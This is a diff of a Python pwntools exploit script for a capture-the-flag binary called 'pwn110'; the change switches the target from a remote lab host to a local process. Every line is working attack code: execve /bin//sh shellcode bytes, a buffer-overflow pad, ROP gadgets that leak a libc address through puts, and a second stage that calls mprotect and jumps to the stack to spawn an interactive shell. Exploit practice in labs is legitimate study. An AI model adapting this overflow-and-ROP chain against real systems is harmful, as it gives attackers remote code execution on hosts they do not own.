@@ -11,6 +11,7 @@ shellCode   = b"\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54
 
 pad = b'A'*0x28 #(40-len(nops)-len(shellCode))
 
+
 pop_rdi_ret = p64(0x000000000040191a)
 pop_rsi_ret = p64(0x000000000040f4de)
 pop_rcx_ret = p64(0x000000000041139b) #pop rcx; add rsp, 0xe8; mov eax, r8d; pop rbx; pop rbp; ret;
@@ -23,14 +24,15 @@ libc_end = p64(binary.sym.__libc_stack_end)
 puts_adr = p64(binary.sym._IO_puts)
 main_adr = p64(binary.sym.main)
 
+
 payload  = pad
 payload += pop_rdi_ret
 payload += libc_end
 payload += puts_adr
 payload += main_adr
 
-p = remote('10.10.90.99', 9010)
-#p = process()
+#p = remote('10.10.145.86', 9010)
+p = process()
 #p = gdb.debug('./pwn110')
 p.recvuntil('libc')
 p.recv()
@@ -55,7 +57,5 @@ rop += p64(mprotect)
 rop += jmp_rsp
 rop += nops
 rop += shellCode
-
 p.sendline(rop)
-
 p.interactive()
